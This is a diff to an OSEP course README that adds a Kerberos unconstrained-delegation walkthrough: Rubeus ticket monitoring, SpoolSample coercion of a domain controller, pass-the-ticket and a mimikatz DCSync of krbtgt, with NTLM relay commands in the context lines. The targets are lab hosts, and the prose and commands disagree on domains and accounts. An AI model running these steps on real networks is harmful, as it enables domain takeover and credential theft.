@@ -8,6 +8,8 @@ Just a bunch of tools built/gathered along the OSEP course.
 6. [TCP Port Redirection via powercat.ps1](#TCP-Port-Redirection-via-powercat.ps1)
 7. [MSSQL Useful Queries](#MSSQL-Useful-Queries)
 8. [MSSQLPwner](#MSSQLPwner)
+- [Kerberos Delegation](#Kerberos Delegation)\
+  - [Unconstrained Delegation](#Unconstrained-Delegation)
 
 
 # Tunneling
@@ -170,3 +172,27 @@ ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.192.152 (gonna dump 
 sudo responder -I tun0 (make sure SMB is turned OFF in /etc/responder/Responder.conf)
 mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay <OUR ATTACKING MACHINE>
 ```
+
+# Kerberos Delegation
+
+## Unconstrained Delegation
+
+- Enumerate: `Get-DomainComputer -Unconstrained -Properties useraccountcontrol,dnshostname | fl`
+Any computer account that contains the `TRUSTED_FOR_DELEGATION` value in its UserAccountControl (UAC) attribute is a viable target.
+
+### Attack Walkthrough
+
+In a high-integrity PS/CMD prompt on the system configured for Unconstrained Delegation, run Rubeus in monitor mode:
+- `.\Rubeus.exe monitor interval:5 /nowrap`
+
+Next, using a domain credential that you’ve previously compromised, trigger the printerbug.py or SpoolSample on the domain controller:
+- `.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB`
+
+`DC01.HACKER.LAB` is the domain controller we want to compromise
+`HELPDESK.HACKER.LAB` is the machine with delegation enabled that we control.
+
+Now, we can inject the ticket into memory using Rubeus:
+- `.\Rubeus.exe ptt /ticket:<BASE64 STRING>`
+
+To complete the attack, we’ll use mimikatz to perform a DCSync using the DC01$ TGT and request the NTLM hash for the dev\administrator account.
+- `lsadump::dcsync /user:megacorp\krbtgt /domain:megacorp.local`
